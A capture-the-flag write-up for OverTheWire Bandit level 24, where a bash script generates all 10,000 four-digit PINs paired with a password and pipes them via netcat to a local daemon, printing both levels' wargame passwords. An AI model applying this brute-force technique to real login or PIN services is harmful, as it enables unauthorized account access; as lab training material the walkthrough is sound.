***A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.***

This one is interesting; we need to devise a fast way to concatenate the password of the current level with a 4-digit numeric pincode, ranging from 0000-9999, and then feed that to the daemon on port 30002 in quick succession. 

We can begin by creating a shell script to print out all iterations of the concatenation:

**`bandit24@bandit:~$ cd /tmp/rajh`**  
**`bandit24@bandit:/tmp/rajh$ vim bruteforce.sh`**  
```
#!/bin/bash

for i in {0000..9999}
do
  echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i" >> bruteforce_list
done
```
**`bandit24@bandit:/tmp/rajh$ chmod 777 bruteforce.sh`**  
**`bandit24@bandit:/tmp/rajh$ ./bruteforce.sh`**  
**`bandit24@bandit:/tmp/rajh$ ls`**  
*`bruteforce_list bruteforce.sh`*  
OPTIONAL: **`bandit24@bandit:/tmp/rajh$ cat bruteforce_list`**  

Now that we have a full list of all concatenated iterations, let's establish a connection with port 30002, and output the contents of the list to that port. It'd also behoove us to limit our output to only return the output correlating to a correct combination. Since I assume the output will be the same for every incorrect attempt, we can use the uniq command to return the unique output: 

**`bandit24@bandit:/tmp/rajh$ cat bruteforce_list | nc localhost 30002 | uniq -u`**  
*`I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.`*  

After letting this execute, it appears there's a problem; the session times out after a bit. It seems we are limited to the amount of iterations we can attempt in a single session. Thus, we will have to split and execute our list in parts, requiring us to amend our shell script:

**`bandit24@bandit:/tmp/rajh$ vim bruteforce.sh`**  
```
#!/bin/bash

for i in {0000..4999}
do
  echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i" >> bruteforce_list1
done

for i in {5000..9999}
do
  echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i" >> bruteforce_list2
done
```
**`bandit24@bandit:/tmp/rajh$ ./bruteforce.sh`**  
**`bandit24@bandit:/tmp/rajh$ ls`**  
*`bruteforce_list  bruteforce_list1  bruteforce_list2  bruteforce.sh`*  

Let's try again:

**`bandit24@bandit:/tmp/rajh$ cat bruteforce_list1 | nc localhost 30002 | uniq -u`**  
*`I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.`*  

This one times out. Next one:

**`bandit24@bandit:/tmp/rajh$ cat bruteforce_list2 | nc localhost 30002 | uniq -u`**  
*`I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.`*  
*`Correct!`*  
*`The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d`*
